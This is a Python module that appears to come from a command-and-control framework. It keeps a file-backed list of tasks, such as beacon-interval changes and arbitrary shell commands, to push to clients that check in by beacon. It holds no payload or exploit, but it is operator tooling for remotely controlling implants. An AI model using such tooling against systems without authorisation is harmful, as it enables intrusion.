#this module only tracks a list of tasks ready to push to the client when it receives a beacon
from printlib import *
task_list = []
task_list_name = ""
loaded_file_name = ""
from os import path

def load_task_list(filename):
    global task_list

    with open(task_list_name, 'r') as file:
        for line in file:
            if line != "\n":
                task_list.append(line.strip("\n"))

def delete_line_in_tasklist(line_no):
    global task_list
    temp_list = []
    counter = 1
    if len(task_list) == 1:
        task_list = []
    else:
        for task in task_list:
            if counter != int(line_no):
                temp_list.append(task)
            else:
                print_good("Deleted line #{} in list".format(line_no))
            counter += 1
        task_list = temp_list

def delete_line_in_tasklist_file(line_no, filename):
    global task_list

    if path.isfile(filename):
        with open(filename, "r+") as f:
            d = f.readlines()
            f.seek(0)
            counter = 1
            for i in d:
                if counter != int(line_no):
                    f.write(i)
                else:
                    print_good("Deleted line #{} in file".format(line_no))
                counter += 1
            f.truncate()


def show_task_list(task_list):
    if len(task_list) == 1:
        print("1 - {}".format(task_list))
    counter = 1
    for task in task_list:
        print("{} - {}".format(counter, task))
        counter += 1

def commit_task_list(save_file_name):
    with open(save_file_name, 'w') as file:
        for task in task_list:
            file.write(task+"\n")
        print_good("Commit is Successful")

if __name__ == "__main__":
    task_list_name = print_question("Enter Task List Name")
    if path.isfile(task_list_name):
        load_task_list(task_list_name)
        print_good("Task List Loaded Successfully")

    while True:
        print("Current Task List:\n",task_list)
        ans = print_question_list("Select Type of Task", "1 - Modify Beacon", "2 - Run a Shell Command", "load", "show", "commit", "delete", "exit")
        if ans == "1":
            temp = print_question("New Beacon Interval (sec)")
            task_list.append("[BEACON]{}".format(temp))
        elif ans == "2":
            temp = print_question("Enter your shell commands")
            task_list.append(temp)
        elif ans == "load":
            temp = print_question("Enter a Filename")
            if path.isfile(task_list_name):
                load_task_list(task_list_name)
                print_good("Task List Loaded Successfully")
            else:
                print_warn("Unable to find file")
        elif ans == "show":
            show_task_list(task_list)
        elif ans == "commit":
            ans = print_question("Keep File Name '{}' [y/n]".format(task_list_name))
            if ans.lower() == "y":
                save_file_name = task_list_name
            if ans.lower() == "n":
                save_file_name = print_question("Enter New File Name")
            commit_task_list(save_file_name)
        elif ans == "delete":
            show_task_list(task_list)
            try:
                line_no = print_question("Enter Line to Remove; [ctrl-c] to break")
                delete_line_in_tasklist_file(line_no, task_list_name)
                delete_line_in_tasklist(line_no)
                print_info("Auto Commit Successful")
            except KeyboardInterrupt:
                pass
        elif ans == "exit":
            print_warn("^punt")
            break